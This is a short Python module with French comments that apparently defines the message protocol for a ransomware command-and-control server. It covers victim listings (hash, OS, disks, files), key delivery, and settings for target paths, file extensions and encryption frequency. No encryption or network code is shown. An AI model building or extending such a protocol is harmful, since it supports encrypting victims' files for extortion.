# Constante
DEBUG_MODE = False

# tous les dictionnaires LIST_VICTIM
LIST_VICTIM_REQ = {'LIST_REQ': None}
LIST_VICTIM_RESP = {'VICTIM': {}, 'HASH': {}, 'OS': {}, 'DISKS': {}, 'STATE': {}, 'NB_FILES': {}}
LIST_VICTIM_END = {'LIST_END': None}

# tous les dictionnaire d'HISTORY
HISTORY_REQ = {'HIST_REQ': ""}
HISTORY_RESP = {'HIST_RESP': {}, 'TIMESTAMP': {}, 'STATE': {}, 'NB_FILES': {}}
HISTORY_END = {'HIST_END': ""}

# dictionnaire de CHANGE_STATE
CHANGE_STATE = {'CHGSTATE': {}, 'STATE': {}}

# tous les dictionnaire de Initialize
INITIALIZE_REQ = {'INITIALIZE': {}, 'OS': {}, 'DISKS': {}}
INITIALIZE_KEY = {'KEY_RESP': {}, 'KEY': {}, 'STATE': {}}
INITIALIZE_RESP = {'CONFIGURE': '', 'SETTING': {
    'DISKS': '',
    'PATHS': {},
    'FILE_EXT': {},
    'FREQ': {},
    'KEY': {},
    'STATE': {}}
                   }

# liste de MESSAGE_TYPE
MESSAGE_TYPE = {
    'LIST_REQ': 'LIST_VICTIM_REQ',
    'VICTIM': 'LIST_VICTIM_RESP',
    'LIST_END': 'LIST_VICTIM_END',
    'HIST_REQ': 'HISTORY_REQ',
    'HIST_RESP': 'HISTORY_RESP',
    'HIST_END': 'HISTORY_END',
    'CHGSTATE': 'CHANGE_STATE',
    'INITIALIZE': 'INITIALIZE_REQ',
    'KEY_RESP': 'INITIALIZE_KEY',
    'CONFIGURE': 'INITIALIZE_RESP'
}


def set_message(select_msg, params=None):
    """
    Cette fonction permet de créer un dictionnaire universel dans tout le programme qui pourra être envoyé
    lu et compris de tous les programmes. Permet par exemple d'être identifié via un get_message_type() afin de rentrer
    dans la bonne condition
    :param select_msg: le nom du type de dictionnaire que l'on veut créer (sert à rentrer dans la bonne condition)
    :param params: une liste contenant tous les paramètres à ajouter (Ex: [1,2,3,4,5,6,7,8])
    :return: le dictionnaire completé
    """
    if select_msg.upper() == 'LIST_VICTIMS_REQ':
        return LIST_VICTIM_REQ

    if select_msg.upper() == 'LIST_VICTIM_RESP':
        # Si le param ne possède pas la longueur demandée, la condition ne s'exécute pas et retourne None
        if len(params) != 6:
            return None
        # Attribution des paramètres aux valeurs du dictionnaire
        LIST_VICTIM_RESP['VICTIM'] = params[0]
        LIST_VICTIM_RESP['HASH'] = params[1]
        LIST_VICTIM_RESP['OS'] = params[2]
        LIST_VICTIM_RESP['DISKS'] = params[3]
        LIST_VICTIM_RESP['STATE'] = params[4]
        LIST_VICTIM_RESP['NB_FILES'] = params[5]
        return LIST_VICTIM_RESP

    elif select_msg.upper() == 'LIST_VICTIM_END':
        return LIST_VICTIM_END

    elif select_msg.upper() == 'HISTORY_REQ':
        # Si le param ne possède pas la longueur demandée, la condition ne s'exécute pas et retourne None
        if len(params) != 1:
            return None
        # Attribution des paramètres aux valeurs du dictionnaire
        HISTORY_REQ['HIST_REQ'] = params[0]
        return HISTORY_REQ

    elif select_msg.upper() == 'HISTORY_RESP':
        # Si le param ne possède pas la longueur demandée, la condition ne s'exécute pas et retourne None
        if len(params) != 4:
            return None
        # Attribution des paramètres aux valeurs du dictionnaire
        HISTORY_RESP['HIST_RESP'] = params[0]
        HISTORY_RESP['TIMESTAMP'] = params[1]
        HISTORY_RESP['STATE'] = params[2]
        HISTORY_RESP['NB_FILES'] = params[3]
        return HISTORY_RESP

    elif select_msg.upper() == 'HISTORY_END':
        # Si le param ne possède pas la longueur demandée, la condition ne s'exécute pas et retourne None
        if len(params) != 1:
            return None
        # Attribution des paramètres aux valeurs du dictionnaire
        HISTORY_END['HIST_END'] = params[0]
        return HISTORY_END

    elif select_msg.upper() == 'CHANGE_STATE':
        # Si le param ne possède pas la longueur demandée, la condition ne s'exécute pas et retourne None
        if len(params) != 2:
            return None
        # Attribution des paramètres aux valeurs du dictionnaire
        CHANGE_STATE['CHGSTATE'] = params[0]
        CHANGE_STATE['STATE'] = params[1]
        return CHANGE_STATE

    elif select_msg.upper() == 'INITIALIZE_REQ':
        # Si le param ne possède pas la longueur demandée, la condition ne s'exécute pas et retourne None
        if len(params) != 3:
            return None
        # Attribution des paramètres aux valeurs du dictionnaire
        INITIALIZE_REQ['INITIALIZE'] = params[0]
        INITIALIZE_REQ['OS'] = params[1]
        INITIALIZE_REQ['DISKS'] = params[2]
        return INITIALIZE_REQ

    elif select_msg.upper() == 'INITIALIZE_KEY':
        # Si le param ne possède pas la longueur demandée, la condition ne s'exécute pas et retourne None
        if len(params) != 3:
            return None
        # Attribution des paramètres aux valeurs du dictionnaire
        INITIALIZE_KEY['KEY_RESP'] = params[0]
        INITIALIZE_KEY['KEY'] = params[1]
        INITIALIZE_KEY['STATE'] = params[2]
        return INITIALIZE_KEY

    elif select_msg.upper() == 'INITIALIZE_RESP':
        # Si le param ne possède pas la longueur demandée, la condition ne s'exécute pas et retourne None
        if len(params) != 7:
            return None
        # Attribution des paramètres aux valeurs du dictionnaire
        INITIALIZE_RESP['CONFIGURE'] = params[0]
        INITIALIZE_RESP['SETTING']['DISKS'] = params[1]
        INITIALIZE_RESP['SETTING']['PATHS'] = params[2]
        INITIALIZE_RESP['SETTING']['FILE_EXT'] = params[3]
        INITIALIZE_RESP['SETTING']['FREQ'] = params[4]
        INITIALIZE_RESP['SETTING']['KEY'] = params[5]
        INITIALIZE_RESP['SETTING']['STATE'] = params[6]
        return INITIALIZE_RESP


def get_message_type(message):
    """
    Cette fonction permet de déterminé quel dictionnaire on a reçu.
    Permet par exemple de déterminé si on a reçu un initialize_req ou list_victim_req afin de rentrer dans la
    bonne condition
    :param message: dictionnaire reçu
    :return: nom de la première clé, identifiant/nom du paquet
    """
    # récupère la première clé
    first_key = list(message.keys())[0]
    # retourne la valeur de la première clé du dictionnaire
    return MESSAGE_TYPE[first_key]
